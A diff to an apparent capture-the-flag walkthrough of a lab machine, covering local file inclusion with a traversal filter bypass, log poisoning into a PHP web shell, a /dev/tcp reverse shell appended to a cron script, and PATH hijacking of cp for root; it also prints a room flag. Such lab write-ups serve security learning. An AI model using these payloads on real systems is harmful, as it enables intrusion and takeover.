@@ -195,7 +195,7 @@ about the <code>path/directory traversal</code> titled article. To understand ho
 
 <p><img src="./images/24.png" alt="alt text" /></p>
 
-<p><code>http://mafialive.thm/test.php?view=php://filter/read=convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php</code></p>
+<p>`http://mafialive.thm/test.php?view=</p>
 
 <p>As you can see below, it gave us to the output of the <code>php</code> application called <code>mrrobot.php</code>.</p>
 
@@ -207,5 +207,265 @@ about the <code>path/directory traversal</code> titled article. To understand ho
 
 <p><img src="./images/26.png" alt="alt text" /></p>
 
-<p>I have also retrieved <code>test.php</code> as an output xD (Does not necessary)</p>
+<p>I have also retrieved <code>test.php</code> as an output xD (Does not necessary). On the other hand, instead of using <code>Cyberchef</code>as a decoder, I decided to work with different tool because I have never found something beneficial. </p>
+
+<p>Using this tool and trying it gave me the ultimate result:</p>
+
+<p><a href="https://www.base64decode.org/">Base64 encoding/decoding</a></p>
+
+<p>```</p>
+
+<p><!DOCTYPE HTML></p>
+
+<html>
+
+<head>
+    <title>INCLUDE</title>
+    <h1>Test Page. Not to be Deployed</h1>
+
+    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
+        <?php
+
+        //FLAG: thm{explo1t1ng_lf1}
+
+            function containsStr($str, $substr) {
+                return strpos($str, $substr) !== false;
+            }
+        if(isset($_GET["view"])){
+        if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
+                include $_GET['view'];
+            }else{
+
+        echo 'Sorry, Thats not allowed';
+            }
+    }
+        ?>
+    </div>
+</body>
+
+</html>
+
+<p>```</p>
+
+<p>Got it ! ! !</p>
+
+<p>if the user attempts <code>../../</code> in the input field then it will be sanitized by application. Moreover,
+secon constraint was the file path's itself user cannot try to navigate <code>/var/www/html/development_testing</code>. It first <code>$_GET[]</code>, built in PHP array responsible for content of the intended endpoint. <code>containStr</code> method tries to validate whether destination endpoint is consisting <code>/var/www/html/development_testing/</code> path.</p>
+
+<p>For instance,
+I attempted to read <code>/etc/passwd</code> file with the help of the <code>LFI</code> ,but it did not give me the /etc/passwd file in base64. Because of the restricted endpoint, I was not able to reach the target base64 formatted passwd file. Since it did not directly including main path. Due to the latest endpoint we were not allowed to move parent directories recursively by using <code>../../</code>. In addition, user must use more than two consecutive dots to reach <code>/</code> then reach <code>etc</code> directory.</p>
+
+<p><code>http://mafialive.thm/test.php?view=php://filter/read=convert.base64-encode/resource=/etc/passwd</code></p>
+
+<p>After that thanks to the source code, it was not tough to bypass resctrictions, I just added extra <code>//</code> between every <code>..</code> string.</p>
+
+<p><code>php://filter/read=convert.base64-encode/resource=/var/www/html/development_testing/..//..//..//..//etc/passwd</code></p>
+
+<p><img src="./images/27.png" alt="alt text" /></p>
+
+<p>we have such user:</p>
+
+<p><code>archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash</code></p>
+
+<p>In <code>Deloitte</code>'s Cyber bootcamp, we have learnt to how to use web servers logs to achieve log poisoning by reaching it <code>LFI</code>.</p>
+
+<p><img src="./images/28.png" alt="alt text" /></p>
+
+<p>We do not need to use <code>php://filter</code> and base64 utility anymore because we found how to bypass restrictions. We should elevate <code>LFI</code> to <code>RCE</code> so as to reach initial compromise phase.</p>
+
+<p>I found a useful resource to elevate LFI to RCE especially when intercepting burp's intercept to apply <code>reverse shell</code>. Firstly, I was wrong about the path to include commands. Instead of <code>error.log</code>, I should have analyzed <code>access.log</code> since access log stores mainly http requests ,so adversary can embed malicious commands or codes.</p>
+
+<p><a href="https://medium.com/@YNS21/utilizing-log-poisoning-elevating-from-lfi-to-rce-5dca90d0a2ac">LFI to RCE</a></p>
+
+<p>Reason why we require to include <code>log</code> file is that I needed to include my payload as an internal process or command to target. Therefore, we have to run commands through headers located in each request.</p>
+
+<p><img src="./images/29.png" alt="alt text" /></p>
+
+<p>Even if the web server running on <code>nginx</code>, we can also apply the same approach in <code>apache</code>.</p>
+
+<p>PHP can be used in two different way:</p>
+
+<p><code>&lt;?=</code>
+<code>&lt;?php</code></p>
+
+<p>In this scenario, you can achieve both with the help of <code>system()</code> method in <code>PHP</code>.</p>
+
+<p>Used payload:</p>
+
+<p><code>&lt;?php system('ls') ?&gt;</code>
+<code>&lt;?= system('ls') ?&gt;</code></p>
+
+<p><img src="./images/30.png" alt="alt text" /></p>
+
+<p><img src="./images/31.png" alt="alt text" /></p>
+
+<p>Let's try <code>PHP</code> one-liner reverse shell against target:</p>
+
+<p>To get reverse shell, we can use <a href="https://www.revshells.com/">reverse shell generator</a>(Web-Based) instead I would like to use my own tool called <code>shell_bringer</code>.</p>
+
+<p>Reach out <a href="https://github.com/onurcangnc/shell_bringer">here</a></p>
+
+<p>you can directly run the tool like this:</p>
+
+<p><code>python shell_bringer_test.py</code></p>
+
+<p>Follow my steps in below:</p>
+
+<ul>
+<li>Select option <code>1</code></li>
+<li>Select <code>PHP</code> (option <code>9</code>)</li>
+<li>Give <code>IPv4</code> option as <code>4</code></li>
+<li>Enter <code>TUN0</code> ip address.</li>
+<li>Enter intended port (1984)</li>
+<li>start with rlwrap or not</li>
+</ul>
+
+<p>Program Output:</p>
+
+<p><img src="./images/32.png" alt="alt text" /></p>
+
+<p><img src="./images/33.png" alt="alt text" /></p>
+
+<p>Now I wanted to understand default <code>cmd</code> variable's instance on target. <code>GET</code> method may help to achieve this since I could not abuse the <code>User-Agent</code> to retrieve reverse shell in each attempt server gets down. I needed to make <code>LFI</code> to <code>RFI</code> so as to make target eligible for downloading in my local files. Therefore, it would run directly it.</p>
+
+<p><code>&lt;?php system($_GET['$cmd']) ?&gt;</code></p>
+
+<p>Generating variable, used in url parameter as <code>cmd</code> can be suitable to include local python server's url.</p>
+
+<p><img src="./images/34.png" alt="alt text" /></p>
+
+<p>As an example I generated <code>$cmd</code> variable in the target by using <code>access</code> log then intended to run <code>id</code> with the system method through command parameter (<code>$cmd</code>). </p>
+
+<p><img src="./images/35.png" alt="alt text" /></p>
+
+<p>Now we are the user <code>www-data</code> by default, reach the <code>user</code> flag from <code>archangel</code> user directory located on <code>/home/archangel</code>.</p>
+
+<p><img src="./images/36.png" alt="alt text" /></p>
+
+<p>I could not find anything related to <code>privilege escalation</code> vector. That's why, I uploaded <code>linpeas.sh</code> from it's generic github repo. </p>
+
+<p>Reach out here below:</p>
+
+<p><img src="./images/37.png" alt="alt text" /></p>
+
+<p><img src="./images/38.png" alt="alt text" /></p>
+
+<p><strong>Notice:</strong> I deliberately downloaded on <code>tmp</code> directory because every user in <code>linux</code> can run commands from here.</p>
+
+<p>Let's run it:</p>
+
+<p>Observe we are the user on <code>web server</code>:</p>
+
+<p><img src="./images/39.png" alt="alt text" /></p>
+
+<p>Crontab had direct horizontal privilege escalation vector in every minute user <code>archangel</code> was running <code>helloworld.sh</code> script.</p>
+
+<p><img src="./images/40.png" alt="alt text" /></p>
+
+<p>From my perspective, I was able to modify the script let's see:</p>
+
+<p>The script could be readable, writeable and every minute system calls it:</p>
+
+<p>```</p>
+
+<p>$ cat helloworld.sh</p>
+
+<h1>!/bin/bash</h1>
+
+<p>echo "hello world" &gt;&gt; /opt/backupfiles/helloworld.txt</p>
+
+<p>```</p>
+
+<p>Now append the payload below:</p>
+
+<p><code>sh -i &gt;&amp; /dev/tcp/10.14.92.189/1900 0&gt;&amp;1</code></p>
+
+<p>I do not want to wait for it ,so I tried and blocked by kernel to run the script. Immediately, I got reverse shell. However, it was <code>www-data</code> because the script is ran by www-data service.</p>
+
+<p><img src="./images/41.png" alt="alt text" /></p>
+
+<p><img src="./images/42.png" alt="alt text" /></p>
+
+<p>Patience was the strongest element in this CTF session :)</p>
+
+<p>Get <code>flag 2</code> from <code>secret</code> directory located in <code>/home/archangel</code></p>
+
+<p><img src="./images/43.png" alt="alt text" /></p>
+
+<p>I tried generic command to understand the user's eligible binaries <code>sudo -l</code> ,but sudo requires tty terminal process let's upgrade shell:</p>
+
+<p><img src="./images/44.png" alt="alt text" /></p>
+
+<p>Normally, most of the shell upgrade operations done by <code>python</code> binary ,so I checked for python binary and found <code>python3</code>:</p>
+
+<p><img src="./images/45.png" alt="alt text" /></p>
+
+<p><a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">Full TTY shell</a></p>
+
+<p>I upgraded my shell by using such payload from above website:</p>
+
+<p><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></p>
+
+<p><img src="./images/46.png" alt="alt text" /></p>
+
+<p>I tried <code>sudo -l</code> ,yet asked me to give password. Therefore, I moved another strategy on <code>secret</code> directory. There was a binary named <code>backup</code> straightly running another service by root.</p>
+
+<p><img src="./images/47.png" alt="alt text" /></p>
+
+<p>When I attempted to run script, It gave an error indication <code>cp</code> operation on the directory not created.</p>
+
+<p><img src="./images/48.png" alt="alt text" /></p>
+
+<p>I reminded that there was another directory on <code>opt</code> named <code>backupfiles</code>. What if we try to cp the provided path to the target.</p>
+
+<p><img src="./images/49.png" alt="alt text" /></p>
+
+<p>However, this was not work since I did not have any files on this path.</p>
+
+<p><code>/home/user/archangel/myfiles/*</code></p>
+
+<p>What about embedding another binary <code>/bin/bash -i</code> so as to get root shell:</p>
+
+<p><code>cp</code> binary is called with a relative name instead of the absolute path so we can make it called a controlled one.</p>
+
+<p>I used similar approach used from <code>GetTheFuckOutBinaries</code>.</p>
+
+<p>-> <a href="https://gtfobins.github.io/gtfobins/cp/">reach</a></p>
+
+<p>```</p>
+
+<p>LFILE=file<em>to</em>write
+TF=$(mktemp)
+echo "DATA" &gt; $TF
+sudo cp $TF $LFILE</p>
+
+<p>```</p>
+
+<p>It gave me error indicating <code>Not a directory</code> ,so using <code>man</code> I found <code>mktemp</code> usage with -d parameter.</p>
+
+<p><img src="./images/50.png" alt="alt text" /></p>
+
+<p><code>man mktemp</code></p>
+
+<p><img src="./images/51.png" alt="alt text" /></p>
+
+<p>To make persistent my binary path <code>/bin/cp</code>, I also call the <code>PATH</code> variable and added my customized path to the target.</p>
+
+<p><img src="./images/52.png" alt="alt text" /></p>
+
+<p>I was creating a binary path representing fake <code>cp</code> command ,but nearly similar as <code>/bin/cp</code>.
+However, I manipulated correct path with <code>/bin/sh</code>. Since I gave all the users executable permissions, <code>backup</code> binary successfully executed the command ,yet it reached different path point, <code>/bin/sh</code>. Then directly invoked shell with root privileges because of the backup script's privileges.</p>
+
+<p>```</p>
+
+<p>erkanucar=$(mktemp -d)
+echo '/bin/sh' &gt; "$erkanucar/cp"
+chmod a+x "$erkanucar/cp"
+export PATH=$erkanucar:$PATH</p>
+
+<p>```</p>
+
+<p>Finally, reach the root flag from <code>/root/</code> path.</p>
+
+<p>May The Pentest Be With You ! ! !</p>
 </body></html>
